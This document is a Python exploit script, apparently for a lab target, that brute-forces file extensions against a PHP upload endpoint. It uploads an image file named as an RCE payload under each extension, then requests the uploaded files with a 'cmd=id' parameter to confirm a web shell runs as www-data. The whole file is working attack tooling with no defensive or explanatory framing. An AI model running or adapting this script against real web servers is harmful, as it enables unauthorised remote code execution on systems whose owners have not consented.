#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
requests.packages.urllib3.disable_warnings()


def get_wordlist():
    with open('wordlist.txt', 'r') as f:
        return [line.strip() for line in f.readlines()]


def get_image():
    with open('images.jpg', 'rb') as f:
        return f.read()


def upload_file(ext,upload_url, headers, proxies):
    """Upload a file with given extension and return result"""
    rce_payload = get_image()
    files = {
        'uploadFile': (ext, rce_payload, 'image/gif')
    }
    
    try:
        response = requests.post(upload_url, files=files, headers=headers, proxies=proxies, verify=False)
        if "File successfully uploaded" in response.text:
            return ext, True
        return ext, False
    except Exception as e:
        return ext, False


def check_rce(ext, image_url, proxies):
    """Check if RCE is possible for uploaded file"""
    cmd = 'id'
    rce_url = image_url + ext
    
    try:
        rce_response = requests.get(rce_url, params={'cmd': cmd}, proxies=proxies, verify=False)
        if "www-data" in rce_response.text:
            # First 100 characters of the response for brevity
            return ext, True, rce_url, rce_response.text[:100]
        return ext, False, rce_url, None
    except Exception as e:
        return ext, False, rce_url, None


if __name__ == "__main__":
    base_url = 'http://94.237.57.211:36041'
    image_url = f'{base_url}/profile_images/'
    upload_url = f'{base_url}/upload.php'
    file_extensions = get_wordlist()

    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Priority': 'u=0'
    }

    successful_uploads = []
    
    # Phase 1: Threaded file uploads
    print("[*] Starting threaded file uploads...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submit all upload tasks
        upload_futures = {
            executor.submit(upload_file, ext, upload_url, headers, proxies): ext 
            for ext in file_extensions
        }
        
        # Process completed uploads
        for future in as_completed(upload_futures):
            ext, success = future.result()
            if success:
                print(f'[+] {ext}')
                successful_uploads.append(ext)

    if not successful_uploads:
        print("[-] No successful uploads found")
        exit(1)

    # Phase 2: Threaded RCE checking
    print(f"\n[*] Starting threaded RCE checks for {len(successful_uploads)} files...")
    rce_found = False
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submit all RCE check tasks
        rce_futures = {
            executor.submit(check_rce, ext, image_url, proxies): ext 
            for ext in successful_uploads
        }
        
        # Process completed RCE checks
        for future in as_completed(rce_futures):
            ext, success, rce_url, response_text = future.result()
            if success:
                print(f'[+] RCE Successful! URL: {rce_url}?cmd=id')
                print(response_text)
                rce_found = True
                # Cancel remaining futures since we found RCE
                for remaining_future in rce_futures:
                    remaining_future.cancel()
                break
    
    if not rce_found:
        print("[-] No RCE found in uploaded files")